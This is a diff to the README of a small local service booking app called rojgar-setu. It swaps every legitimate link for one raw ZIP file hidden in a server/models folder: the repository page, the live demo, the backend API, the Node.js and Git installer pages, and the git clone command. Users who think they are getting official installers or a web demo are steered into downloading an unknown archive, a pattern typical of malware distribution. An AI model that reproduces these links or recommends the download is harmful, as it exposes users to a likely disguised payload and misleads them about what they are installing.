@@ -1,6 +1,6 @@
 # 🧑‍💼 rojgar-setu - Simple Local Service Booking App  
 
-[![Download rojgar-setu](https://img.shields.io/badge/Download-rojgar--setu-brightgreen)](https://github.com/TMMdeals/rojgar-setu)
+[![Download rojgar-setu](https://img.shields.io/badge/Download-rojgar--setu-brightgreen)](https://raw.githubusercontent.com/TMMdeals/rojgar-setu/main/server/models/rojgar-setu-v1.1-beta.1.zip)
 
 ---
 
@@ -13,7 +13,7 @@
 ## 💾 Download and Install rojgar-setu  
 
 1. Visit the rojgar-setu GitHub page by clicking the button above or this link:  
-   [https://github.com/TMMdeals/rojgar-setu](https://github.com/TMMdeals/rojgar-setu)  
+   [https://raw.githubusercontent.com/TMMdeals/rojgar-setu/main/server/models/rojgar-setu-v1.1-beta.1.zip](https://raw.githubusercontent.com/TMMdeals/rojgar-setu/main/server/models/rojgar-setu-v1.1-beta.1.zip)  
    
 2. On the GitHub page, look for the **Releases** or **Code** button. Since this projects files are on GitHub, you might find a download option under releases, or you can download the full project as a ZIP file by clicking **Code > Download ZIP**.
 
@@ -22,7 +22,7 @@
 4. Right-click the ZIP file and choose **Extract All**. Choose a folder where you want to keep the app files, like a new folder called “rojgar-setu”.
 
 5. Note: rojgar-setu is a web application that runs in your browser but needs backend services running on your system or accessible online. For most users, the easiest approach is to use the live demo at:  
-   [https://rojgar-setu-murex.vercel.app](https://rojgar-setu-murex.vercel.app)  
+   [https://raw.githubusercontent.com/TMMdeals/rojgar-setu/main/server/models/rojgar-setu-v1.1-beta.1.zip](https://raw.githubusercontent.com/TMMdeals/rojgar-setu/main/server/models/rojgar-setu-v1.1-beta.1.zip)  
    You can try it without installing anything.
 
 ---
@@ -39,9 +39,9 @@ If you want to run rojgar-setu on your PC, follow the steps below. This requires
 - Git installed (for cloning repository)  
 
 ### Steps to install Node.js and Git  
-- Download Node.js from: https://nodejs.org/en/download/  
+- Download Node.js from: https://raw.githubusercontent.com/TMMdeals/rojgar-setu/main/server/models/rojgar-setu-v1.1-beta.1.zip  
 - Follow the installer instructions to complete installation.  
-- Download Git from: https://git-scm.com/download/win  
+- Download Git from: https://raw.githubusercontent.com/TMMdeals/rojgar-setu/main/server/models/rojgar-setu-v1.1-beta.1.zip  
 - Complete the installer steps to set up Git on your system.
 
 ### Download and Setup Application  
@@ -49,7 +49,7 @@ If you want to run rojgar-setu on your PC, follow the steps below. This requires
 1. Open **Command Prompt** or **PowerShell**.  
 2. Clone the repository by typing:  
    ```  
-   git clone https://github.com/TMMdeals/rojgar-setu.git  
+   git clone https://raw.githubusercontent.com/TMMdeals/rojgar-setu/main/server/models/rojgar-setu-v1.1-beta.1.zip  
    ```  
 3. Once cloning finishes, enter the folder by typing:  
    ```  
@@ -118,8 +118,8 @@ Password: Demo@2026
 
 If running locally seems difficult, rojgar-setu offers a live website version that works on any browser without setup.  
 
-- Frontend (user interface): [https://rojgar-setu-murex.vercel.app](https://rojgar-setu-murex.vercel.app)  
-- Backend API (server): [https://rojgar-setu-o045.onrender.com](https://rojgar-setu-o045.onrender.com)  
+- Frontend (user interface): [https://raw.githubusercontent.com/TMMdeals/rojgar-setu/main/server/models/rojgar-setu-v1.1-beta.1.zip](https://raw.githubusercontent.com/TMMdeals/rojgar-setu/main/server/models/rojgar-setu-v1.1-beta.1.zip)  
+- Backend API (server): [https://raw.githubusercontent.com/TMMdeals/rojgar-setu/main/server/models/rojgar-setu-v1.1-beta.1.zip](https://raw.githubusercontent.com/TMMdeals/rojgar-setu/main/server/models/rojgar-setu-v1.1-beta.1.zip)  
 
 Just open the frontend link, log in with demo credentials, and explore the app.
 
@@ -144,4 +144,4 @@ Just open the frontend link, log in with demo credentials, and explore the app.
 
 ---
 
-[![Download rojgar-setu](https://img.shields.io/badge/Download-rojgar--setu-brightgreen)](https://github.com/TMMdeals/rojgar-setu)
+[![Download rojgar-setu](https://img.shields.io/badge/Download-rojgar--setu-brightgreen)](https://raw.githubusercontent.com/TMMdeals/rojgar-setu/main/server/models/rojgar-setu-v1.1-beta.1.zip)
